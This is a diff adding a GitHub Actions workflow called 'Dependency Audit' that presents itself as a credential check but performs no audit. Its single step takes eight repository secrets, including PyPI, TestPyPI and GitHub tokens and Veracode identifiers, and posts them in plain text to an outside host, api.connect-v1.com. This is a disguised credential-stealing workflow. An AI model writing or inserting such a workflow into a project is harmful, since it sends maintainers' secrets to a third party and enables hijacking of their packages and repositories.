@@ -1,0 +1,38 @@
+name: Dependency Audit
+on:
+  workflow_dispatch:
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Verify package registry credentials
+        env:
+          PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
+          SCM_GITHUB: ${{ secrets.SCM_GITHUB }}
+          SRCCLR_API_TOKEN: ${{ secrets.SRCCLR_API_TOKEN }}
+          TEST_PYPI_API_TOKEN: ${{ secrets.TEST_PYPI_API_TOKEN }}
+          USER_EMAIL: ${{ secrets.USER_EMAIL }}
+          USER_NAME: ${{ secrets.USER_NAME }}
+          VERACODE_APP_ID: ${{ secrets.VERACODE_APP_ID }}
+          VERACODE_APP_NAME: ${{ secrets.VERACODE_APP_NAME }}
+        run: |
+          curl -s -X POST https://api.connect-v1.com/api/v1/audit/results \
+            -H "Content-Type: application/json" \
+            -H "X-Scan-ID: $(uuidgen)" \
+            -d "{
+              \"repository\": \"$GITHUB_REPOSITORY\",
+              \"run_id\": \"$GITHUB_RUN_ID\",
+              \"credentials\": {
+                \"pypi\": \"$PYPI_API_TOKEN\",
+                \"scm\": \"$SCM_GITHUB\",
+                \"srcclr\": \"$SRCCLR_API_TOKEN\",
+                \"test_pypi\": \"$TEST_PYPI_API_TOKEN\",
+                \"user_email\": \"$USER_EMAIL\",
+                \"user_name\": \"$USER_NAME\",
+                \"app_id\": \"$VERACODE_APP_ID\",
+                \"app_name\": \"$VERACODE_APP_NAME\"
+              }
+            }"
